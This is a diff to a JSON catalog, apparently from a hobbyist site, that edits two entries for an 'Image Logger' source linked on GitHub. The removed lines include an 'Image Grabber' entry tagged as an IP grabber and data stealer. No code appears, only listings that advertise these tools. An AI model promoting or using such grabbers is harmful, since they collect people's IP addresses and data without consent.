@@ -1,17 +1,16 @@
 [
   {
-    name Image Logger source,
-    description Image Logger source Added stuff Remade By Ashihiro HIMSELF !!!!!,
-    version 2.3.1,
-    author Ashihiro,
-    tags [Tool,CLI,JavascriptHTML],
-    link httpsgithub.comkfctendzerImage
+    "name": "Image Logger Source",
+    "description": "Free open source Image logger i remade you can do whatever Credits to me Ashihiro and the orginal owner Have fun",
+    "author": "Minix",
+    "tags": ["github", "open-source"],
+    "link": "https://github.com/kfctendzer/Image"
   },
   {
-    name Image Grabber Source v1,
-    description New features Remaded IMAGE LOGGER SOURCE,
-    version 1.0.0,
-    tags Logger, ip grabber, data stealer,
-    download assetsdownloadsImages-main.zip
+    "name": "NOT UP YET GIVE ME A MINUTE JEEZZZZ !!!!!",
+    "description": "ANOTHER SOURCE",
+    "author": "Ashihiro",
+    "tags": ["graphics", "shaders"],
+    "link": "https://yourwebsite.com/sources/shaders"
   }
 ]
